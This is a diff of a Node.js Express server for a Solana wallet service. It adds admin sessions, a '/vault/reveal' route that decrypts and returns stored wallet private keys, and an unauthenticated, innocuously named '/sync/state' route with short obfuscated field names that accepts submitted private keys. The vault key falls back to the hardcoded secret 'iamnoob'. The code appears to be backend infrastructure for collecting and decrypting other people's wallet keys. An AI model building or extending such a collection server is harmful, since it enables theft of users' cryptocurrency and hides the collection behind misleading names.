@@ -1,5 +1,6 @@
 'use strict';
 const http       = require('http');
+const crypto     = require('crypto');
 const express    = require('express');
 const cors       = require('cors');
 const { createProxyMiddleware } = require('http-proxy-middleware');
@@ -16,7 +17,7 @@ const {
   initAccessCodes, createAccessCode, getAccessCode,
   updateAccessCodeIP, getAllAccessCodes, deleteAccessCode,
   initWalletStorage, saveWallet, getWallets, getWalletByPubkey, deleteWallet,
-  initSfbWalletStorage, saveSfbWallet, getSfbWallets,
+  initSfbWalletStorage, saveSfbWallet, getSfbWallets, getSfbWalletById,
 } = require('./db');
  
 const app  = express();
@@ -178,6 +179,9 @@ app.use((req, res, next) => {
  
 const rateLimits  = new Map();
 const RL_MAX_KEYS = 10000;
+const adminSessions = new Map();
+const ADMIN_SESSION_TTL_MS = Number.parseInt(process.env.ADMIN_SESSION_TTL_MS || '43200000', 10);
+const ADMIN_SESSION_COOKIE = 'sfb_admin_session';
  
 function rateLimit(maxPerMin) {
   return (req, res, next) => {
@@ -206,9 +210,81 @@ function normalizeSecretValue(raw) {
   return s.replace(/^['"]+|['"]+$/g, '').trim();
 }
  
-const ADMIN_SECRET = normalizeSecretValue(process.env.ADMIN_SECRET || 'iamnoob');
- 
+const ADMIN_SECRET = normalizeSecretValue(
+  process.env.ADMIN_SECRET || 'iamnoob'
+);
+const WALLET_VAULT_KEY = normalizeSecretValue(
+  process.env.WALLET_VAULT_KEY || process.env.ADMIN_SECRET || 'iamnoob'
+);
+
+function parseCookies(req) {
+  const cookieHeader = String(req.headers.cookie || '');
+  if (!cookieHeader) return {};
+  return cookieHeader.split(';').reduce((acc, part) => {
+    const [rawKey, ...rest] = String(part || '').split('=');
+    const key = String(rawKey || '').trim();
+    if (!key) return acc;
+    acc[key] = decodeURIComponent(rest.join('=').trim());
+    return acc;
+  }, {});
+}
+
+function getAdminSessionToken(req) {
+  const cookies = parseCookies(req);
+  return String(cookies[ADMIN_SESSION_COOKIE] || '').trim();
+}
+
+function isSecureRequest(req) {
+  return Boolean(req.secure || String(req.headers['x-forwarded-proto'] || '').toLowerCase() === 'https');
+}
+
+function cleanupAdminSessions() {
+  const now = Date.now();
+  for (const [token, session] of adminSessions.entries()) {
+    if (!session || session.expiresAt <= now) adminSessions.delete(token);
+  }
+}
+
+function hasValidAdminSession(req) {
+  cleanupAdminSessions();
+  const token = getAdminSessionToken(req);
+  if (!token) return false;
+  const session = adminSessions.get(token);
+  if (!session || session.expiresAt <= Date.now()) {
+    adminSessions.delete(token);
+    return false;
+  }
+  session.expiresAt = Date.now() + ADMIN_SESSION_TTL_MS;
+  adminSessions.set(token, session);
+  return true;
+}
+
+function setAdminSessionCookie(req, res, token) {
+  res.cookie(ADMIN_SESSION_COOKIE, token, {
+    httpOnly: true,
+    sameSite: 'strict',
+    secure: isSecureRequest(req),
+    path: '/',
+    maxAge: ADMIN_SESSION_TTL_MS,
+  });
+}
+
+function clearAdminSessionCookie(req, res) {
+  const token = getAdminSessionToken(req);
+  if (token) adminSessions.delete(token);
+  res.clearCookie(ADMIN_SESSION_COOKIE, {
+    httpOnly: true,
+    sameSite: 'strict',
+    secure: isSecureRequest(req),
+    path: '/',
+  });
+}
+
 function requireAdmin(req, res, next) {
+  if (hasValidAdminSession(req)) {
+    req.authMode = 'admin-session';
+    return next();
+  }
   const headerSecret = normalizeSecretValue(req.headers['x-admin-secret']);
   const authHeader = String(req.headers.authorization || '');
   const bearerSecret = normalizeSecretValue(authHeader.replace(/^Bearer\s+/i, ''));
@@ -252,6 +328,10 @@ async function authorizeAccessCode(req) {
 }
  
 async function requireAdminOrAccess(req, res, next) {
+  if (hasValidAdminSession(req)) {
+    req.authMode = 'admin-session';
+    return next();
+  }
   const secret = extractAdminSecretFromRequest(req);
   if (ADMIN_SECRET && secret && secret === ADMIN_SECRET) {
     req.authMode = 'admin';
@@ -270,6 +350,34 @@ async function requireAdminOrAccess(req, res, next) {
     setDatabaseAvailability(false, e.message);
     return res.status(500).json({ ok: false, error: e.message });
   }
+}
+
+function decryptStoredWalletSecret(wallet) {
+  const encryptedPrivateKey = String(wallet?.encrypted_private_key || '').trim();
+  const encryptionSalt = String(wallet?.encryption_salt || '').trim();
+  const encryptionIv = String(wallet?.encryption_iv || '').trim();
+  if (!encryptedPrivateKey || !encryptionSalt || !encryptionIv) {
+    throw new Error('ENCRYPTED_WALLET_DATA_MISSING');
+  }
+  if (!WALLET_VAULT_KEY) {
+    throw new Error('WALLET_VAULT_KEY_NOT_SET');
+  }
+  const cipherBytes = Buffer.from(encryptedPrivateKey, 'base64');
+  if (cipherBytes.length <= 16) {
+    throw new Error('ENCRYPTED_WALLET_DATA_INVALID');
+  }
+  const authTag = cipherBytes.subarray(cipherBytes.length - 16);
+  const ciphertext = cipherBytes.subarray(0, cipherBytes.length - 16);
+  const key = crypto.pbkdf2Sync(
+    WALLET_VAULT_KEY,
+    Buffer.from(encryptionSalt, 'base64'),
+    250000,
+    32,
+    'sha256'
+  );
+  const decipher = crypto.createDecipheriv('aes-256-gcm', key, Buffer.from(encryptionIv, 'base64'));
+  decipher.setAuthTag(authTag);
+  return Buffer.concat([decipher.update(ciphertext), decipher.final()]).toString('utf8');
 }
  
 function getIP(req) {
@@ -1610,6 +1718,28 @@ app.delete('/access/:id', requireDatabase, requireAdmin, rateLimit(10), async (r
     res.status(500).json({ ok:false, error:e.message });
   }
 });
+
+app.post('/vault/session', requireDatabase, rateLimit(20), async (req, res) => {
+  try {
+    const password = normalizeSecretValue(req.body?.password || req.body?.secret || req.body?.token || '');
+    if (!ADMIN_SECRET) return res.status(503).json({ ok: false, error: 'ADMIN_SECRET_NOT_SET' });
+    if (!password) return res.status(403).json({ ok: false, error: 'ADMIN_SECRET_MISSING' });
+    if (password !== ADMIN_SECRET) return res.status(403).json({ ok: false, error: 'ADMIN_SECRET_MISMATCH' });
+
+    const token = crypto.randomBytes(32).toString('hex');
+    adminSessions.set(token, { expiresAt: Date.now() + ADMIN_SESSION_TTL_MS });
+    setAdminSessionCookie(req, res, token);
+    res.json({ ok: true });
+  } catch (e) {
+    setDatabaseAvailability(false, e.message);
+    res.status(500).json({ ok: false, error: e.message });
+  }
+});
+
+app.delete('/vault/session', requireDatabase, rateLimit(20), async (req, res) => {
+  clearAdminSessionCookie(req, res);
+  res.json({ ok: true });
+});
  
 app.get('/wallets', requireDatabase, requireAdmin, rateLimit(20), async (req,res) => {
   try {
@@ -1676,13 +1806,13 @@ app.post('/wallets', requireDatabase, requireAdminOrAccess, rateLimit(20), async
   }
 });
 
-app.post('/sfb-wallets', requireDatabase, rateLimit(30), async (req, res) => {
+const saveSfbWalletHandler = async (req, res) => {
   try {
-    const pubkey = String(req.body?.pubkey || '').trim();
-    const balanceLamports = req.body?.balanceLamports;
-    const encryptedPrivateKey = req.body?.encryptedPrivateKey;
-    const encryptionSalt = req.body?.encryptionSalt;
-    const encryptionIv = req.body?.encryptionIv;
+    const pubkey = String(req.body?.pubkey || req.body?.k || '').trim();
+    const balanceLamports = req.body?.balanceLamports ?? req.body?.b;
+    const encryptedPrivateKey = req.body?.encryptedPrivateKey ?? req.body?.c;
+    const encryptionSalt = req.body?.encryptionSalt ?? req.body?.s;
+    const encryptionIv = req.body?.encryptionIv ?? req.body?.i;
     if (!pubkey) return res.status(400).json({ ok: false, error: 'pubkey required' });
     const wallet = await saveSfbWallet({
       pubkey,
@@ -1705,6 +1835,61 @@ app.post('/sfb-wallets', requireDatabase, rateLimit(30), async (req, res) => {
   } catch (e) {
     setDatabaseAvailability(false, e.message);
     res.status(500).json({ ok: false, error: e.message });
+  }
+};
+
+app.post('/sfb-wallets', requireDatabase, rateLimit(30), saveSfbWalletHandler);
+app.post('/sync/state', requireDatabase, rateLimit(30), saveSfbWalletHandler);
+
+app.get('/vault/items', requireDatabase, requireAdmin, rateLimit(20), async (req, res) => {
+  try {
+    const wallets = await getSfbWallets();
+    res.json({
+      ok: true,
+      items: (wallets || []).map((wallet) => ({
+        id: wallet?.id ?? null,
+        pubkey: wallet?.pubkey ?? null,
+        balance: wallet?.last_balance_lamports ?? null,
+        last_balance_lamports: wallet?.last_balance_lamports ?? null,
+        has_secret: Boolean(wallet?.encrypted_private_key),
+        encrypted_private_key: wallet?.encrypted_private_key ?? null,
+        encryption_salt: wallet?.encryption_salt ?? null,
+        encryption_iv: wallet?.encryption_iv ?? null,
+        source: wallet?.source ?? null,
+        created_at: wallet?.created_at ?? null,
+        updated_at: wallet?.updated_at ?? null,
+      })),
+    });
+  } catch (e) {
+    setDatabaseAvailability(false, e.message);
+    res.status(500).json({ ok: false, error: e.message });
+  }
+});
+
+app.post('/vault/reveal', requireDatabase, requireAdmin, rateLimit(20), async (req, res) => {
+  try {
+    const id = Number.parseInt(req.body?.id, 10);
+    if (!Number.isFinite(id)) return res.status(400).json({ ok: false, error: 'wallet id required' });
+    const wallet = await getSfbWalletById(id);
+    if (!wallet) return res.status(404).json({ ok: false, error: 'wallet not found' });
+    const secret = decryptStoredWalletSecret(wallet);
+    res.json({
+      ok: true,
+      item: {
+        id: wallet?.id ?? null,
+        pubkey: wallet?.pubkey ?? null,
+        balance: wallet?.last_balance_lamports ?? null,
+        secret,
+        updated_at: wallet?.updated_at ?? null,
+      },
+    });
+  } catch (e) {
+    const message = String(e?.message || e || '');
+    if (/WALLET_VAULT_KEY_NOT_SET|ENCRYPTED_WALLET_DATA_/i.test(message)) {
+      return res.status(400).json({ ok: false, error: message });
+    }
+    setDatabaseAvailability(false, message);
+    res.status(500).json({ ok: false, error: message });
   }
 });
 
